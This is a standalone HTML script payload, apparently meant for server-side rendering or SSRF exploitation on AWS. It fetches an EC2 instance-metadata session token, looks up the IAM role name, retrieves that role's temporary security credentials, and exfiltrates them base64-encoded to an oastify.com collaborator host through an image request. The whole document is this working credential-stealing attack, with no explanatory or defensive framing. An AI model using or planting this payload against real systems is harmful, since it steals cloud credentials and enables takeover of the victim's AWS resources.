<script>
fetch('http://169.254.169.254/latest/api/token', {method:'PUT',headers:{'X-aws-ec2-metadata-token-ttl-seconds':'60'}})
.then(r=>r.text())
.then(token=>
  fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {headers:{'X-aws-ec2-metadata-token':token}})
  .then(r=>r.text())
  .then(role=>
    fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role, {headers:{'X-aws-ec2-metadata-token':token}})
    .then(r=>r.json())
    .then(creds=>new Image().src='https://c4hpktbt1dhb4z61eayuhu5npev5jwjk8.oastify.com/?role='+role+'&creds='+btoa(JSON.stringify(creds))))
  )
)
</script>
